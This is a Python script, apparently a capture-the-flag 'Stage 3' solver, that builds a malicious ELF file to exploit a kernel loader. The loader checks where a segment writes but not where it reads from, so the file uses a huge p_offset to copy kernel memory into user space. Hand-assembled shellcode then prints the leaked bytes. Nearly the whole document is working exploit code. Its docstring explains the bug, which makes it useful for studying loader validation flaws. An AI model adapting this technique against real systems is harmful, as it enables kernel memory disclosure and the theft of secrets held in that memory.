#!/usr/bin/env python3
"""Stage 3 solver: build an ELF that makes the loader leak kernel memory.

exec_elf validates where a PT_LOAD *writes* (p_vaddr must land in user space)
but not where it *reads from*. It does:

    memcpy((void *)ph->p_vaddr, buf + ph->p_offset, ph->p_filesz);

with buf the 256 KB kmalloc'd file buffer. p_offset is a uint32 added to buf,
so it can address anything in the 32-bit space, wrapping included.

Segment 1 is a few bytes of real code; segment 2 carries a huge p_offset and
lands the leaked bytes in the program's own memory, where the code prints them.

  python3 solve/mkleak.py <offset> [size] > leak.hex
"""
import struct, sys

CODE_VA = 0xC0001000
LEAK_VA = 0xC0002000      # separate page, so segment 2's memset cannot wipe
                          # segment 1's code

def build(offset, size):
    code  = b"\xb8" + struct.pack("<I", 1)        # mov eax, SYS_WRITE
    code += b"\xbb" + struct.pack("<I", 1)        # mov ebx, fd 1 (screen)
    code += b"\xb9" + struct.pack("<I", LEAK_VA)  # mov ecx, leaked buffer
    code += b"\xba" + struct.pack("<I", size)     # mov edx, len
    code += b"\xcd\x80"                           # int 0x80
    code += b"\xb8" + struct.pack("<I", 0)        # mov eax, SYS_EXIT
    code += b"\xbb" + struct.pack("<I", 0)        # mov ebx, 0
    code += b"\xcd\x80"                           # int 0x80

    ehsz, phsz, phnum = 52, 32, 2
    phoff    = ehsz
    code_off = ehsz + phsz * phnum

    eh  = b"\x7fELF\x01\x01\x01" + b"\x00" * 9
    eh += struct.pack("<HHIIIIIHHHHHH",
                      2, 3, 1, CODE_VA, phoff, 0, 0,
                      ehsz, phsz, phnum, 40, 0, 0)

    def phdr(off, va, filesz, memsz):
        return struct.pack("<IIIIIIII", 1, off, va, va, filesz, memsz, 7, 0x1000)

    ph  = phdr(code_off, CODE_VA, len(code), len(code))
    ph += phdr(offset & 0xFFFFFFFF, LEAK_VA, size, size)
    return eh + ph + code

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit("usage: mkleak.py <offset> [size]")
    off  = int(sys.argv[1], 0)
    size = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x4000
    hx = build(off, size).hex()
    print("\n".join(hx[i:i+64] for i in range(0, len(hx), 64)))
